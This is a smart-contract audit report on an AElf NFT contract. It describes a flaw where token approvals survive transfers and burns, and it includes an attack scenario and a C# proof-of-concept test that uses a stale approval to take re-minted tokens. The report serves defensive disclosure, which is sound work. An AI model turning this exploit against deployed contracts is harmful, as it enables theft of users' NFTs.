# Audit Report

## Title
Stale NFT Approvals Persist After Token Transfer Enabling Unauthorized Reuse

## Summary
The NFT contract fails to invalidate approvals when tokens are transferred or burned, allowing previously approved spenders to exploit stale approvals if the original owner later re-acquires tokens with the same tokenId. This enables unauthorized asset theft without fresh consent.

## Finding Description

The NFT contract stores approvals in `AllowanceMap` keyed by `(tokenHash, owner, spender)` where tokenHash is computed from the symbol and tokenId. [1](#0-0) 

When an NFT owner transfers tokens via `Transfer()`, the method only updates balance mappings through `DoTransfer()` without clearing the `AllowanceMap`. [2](#0-1) 

The `DoTransfer()` helper exclusively manipulates `BalanceMap` entries and never touches approval state. [3](#0-2) 

Similarly, the `Burn()` method only decrements balances and supply counters without clearing approvals. [4](#0-3) 

When `TransferFrom()` is called, it checks the persistent `AllowanceMap` entry for authorization. [5](#0-4) 

The `Approve()` method sets allowances using the tokenHash as the primary key. [6](#0-5) 

The tokenHash is calculated deterministically from symbol and tokenId, making it identical for any future token with the same identifiers. [7](#0-6) 

NFT protocols can be created with `IsTokenIdReuse=true`, explicitly allowing the same tokenId to be minted multiple times after burning. [8](#0-7) 

**Attack Scenario:**
1. Alice owns 10 NFTs (symbol="GOLD", tokenId=5)
2. Alice approves Bob for 10 NFTs via `Approve()` → `AllowanceMap[Hash("GOLD5")][Alice][Bob] = 10`
3. Alice transfers all 10 NFTs to Charlie using `Transfer()` → Approval persists
4. Alice later mints/receives 10 new NFTs with tokenId=5 (same tokenHash)
5. Bob calls `TransferFrom(From=Alice, Amount=10)` using the stale approval
6. The contract checks `AllowanceMap[Hash("GOLD5")][Alice][Bob]` → still shows 10
7. Bob successfully steals Alice's new NFTs without her consent

## Impact Explanation

This vulnerability enables **direct asset theft** through stale approval exploitation. The impact is severe because:

- **Asset Loss**: Attackers can steal high-value NFTs without authorization from the current owner
- **Bypass of Security Model**: The approval system is designed to provide time-limited, explicit consent. Persistent approvals after ownership changes break this security guarantee
- **Protocol-Wide Issue**: Affects all NFT protocols using `IsTokenIdReuse=true`, which is a legitimate protocol configuration option
- **No Owner Protection**: Victims have no way to detect stale approvals unless they manually query and revoke each historical approval before re-acquiring tokens

The severity is **High** because it allows unauthorized fund extraction through exploitation of normal user workflows (marketplace approvals followed by transfers).

## Likelihood Explanation

This vulnerability is **Medium-High likelihood** to be exploited:

**Reachable Entry Points:**
- All methods are public and accessible to any user: `Approve()`, `Transfer()`, and `TransferFrom()`

**Feasible Preconditions:**
1. Victim grants approval (standard marketplace/DEX interaction)
2. Victim transfers tokens away (common operation)  
3. Victim later receives/mints tokens with same tokenId (facilitated by `IsTokenIdReuse=true` protocols)

**Attack Practicality:**
- No special privileges required
- Single `TransferFrom()` transaction after monitoring on-chain state
- No timing constraints or race conditions
- Attacker can wait indefinitely for victim to re-acquire matching tokenIds

**Economic Rationality:**
- Minimal transaction costs compared to stolen NFT value
- Profitable for any NFT worth more than gas fees (~$10-100)
- Particularly attractive for high-value NFT collections

**Real-World Scenarios:**
- User approves marketplace contract, changes mind, transfers to cold wallet
- User later buys back same tokenId from marketplace
- Original marketplace approval remains active and can drain new tokens

## Recommendation

Clear all approvals when tokens are transferred or burned. Modify `DoTransfer()` and `Burn()` to invalidate allowances:

**Fix for DoTransfer():**
After balance updates, add:
```csharp
State.AllowanceMap[tokenHash][from].Remove();
```

**Fix for Burn():**
After balance decrement, add:
```csharp
State.AllowanceMap[tokenHash][Context.Sender].Remove();
```

Alternatively, implement an approval nonce system where each ownership period gets a unique nonce, and approvals include this nonce for validation.

## Proof of Concept

```csharp
[Fact]
public async Task StaleApprovalExploit_Test()
{
    // Setup: Create NFT protocol with IsTokenIdReuse=true
    var symbol = await CreateTest(); // Creates protocol
    await AddMinterAsync(symbol);
    
    // Step 1: Mint tokenId=1 to Alice (MinterAddress)
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        TokenId = 1,
        Quantity = 10,
        Owner = MinterAddress
    });
    
    // Step 2: Alice approves Bob (DefaultAddress) for 10 tokens
    await MinterNFTContractStub.Approve.SendAsync(new ApproveInput
    {
        Spender = DefaultAddress,
        Symbol = symbol,
        TokenId = 1,
        Amount = 10
    });
    
    // Verify approval exists
    var allowance1 = (await NFTContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = MinterAddress,
        Spender = DefaultAddress,
        Symbol = symbol,
        TokenId = 1
    })).Allowance;
    allowance1.ShouldBe(10); // ✓ Approval set
    
    // Step 3: Alice transfers ALL tokens to Charlie (User1Address)
    await MinterNFTContractStub.Transfer.SendAsync(new TransferInput
    {
        To = User1Address,
        Symbol = symbol,
        TokenId = 1,
        Amount = 10
    });
    
    // Verify Alice has zero balance
    var aliceBalance = (await MinterNFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    aliceBalance.ShouldBe(0);
    
    // Step 4: Check if approval persists (IT DOES - THIS IS THE BUG)
    var allowance2 = (await NFTContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = MinterAddress,
        Spender = DefaultAddress,
        Symbol = symbol,
        TokenId = 1
    })).Allowance;
    allowance2.ShouldBe(10); // ✗ BUG: Stale approval still exists!
    
    // Step 5: Alice later mints/receives new tokens with same tokenId=1
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        TokenId = 1,
        Quantity = 10,
        Owner = MinterAddress
    });
    
    // Step 6: Bob exploits stale approval to steal Alice's new tokens
    await NFTContractStub.TransferFrom.SendAsync(new TransferFromInput
    {
        From = MinterAddress,
        To = DefaultAddress,
        Symbol = symbol,
        TokenId = 1,
        Amount = 10
    });
    
    // Verify exploit succeeded - Bob stole Alice's tokens
    var bobBalance = (await NFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = DefaultAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    bobBalance.ShouldBe(10); // ✗ VULNERABILITY: Unauthorized transfer succeeded!
    
    var aliceBalanceAfter = (await MinterNFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    aliceBalanceAfter.ShouldBe(0); // Alice lost all tokens without consent
}
```

This test demonstrates that approvals persist across ownership changes, enabling unauthorized transfers when the original owner re-acquires tokens with the same tokenId.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L30-30)
```csharp
    public MappedState<Hash, Address, Address, long> AllowanceMap { get; set; }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L21-35)
```csharp
    public override Empty Transfer(TransferInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        DoTransfer(tokenHash, Context.Sender, input.To, input.Amount);
        Context.Fire(new Transferred
        {
            From = Context.Sender,
            To = input.To,
            Amount = input.Amount,
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Memo = input.Memo
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L57-80)
```csharp
    public override Empty TransferFrom(TransferFromInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var operatorList = State.OperatorMap[input.Symbol][input.From];
        var isOperator = operatorList?.Value.Contains(Context.Sender) ?? false;
        if (!isOperator)
        {
            var allowance = State.AllowanceMap[tokenHash][input.From][Context.Sender];
            Assert(allowance >= input.Amount, "Not approved.");
            State.AllowanceMap[tokenHash][input.From][Context.Sender] = allowance.Sub(input.Amount);
        }

        DoTransfer(tokenHash, input.From, input.To, input.Amount);
        Context.Fire(new Transferred
        {
            From = input.From,
            To = input.To,
            Amount = input.Amount,
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Memo = input.Memo
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L295-308)
```csharp
    public override Empty Approve(ApproveInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        State.AllowanceMap[tokenHash][Context.Sender][input.Spender] = input.Amount;
        Context.Fire(new Approved
        {
            Owner = Context.Sender,
            Spender = input.Spender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L330-333)
```csharp
    private Hash CalculateTokenHash(string symbol, long tokenId)
    {
        return HashHelper.ComputeFrom($"{symbol}{tokenId}");
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L48-48)
```csharp
            IsTokenIdReuse = input.IsTokenIdReuse,
```
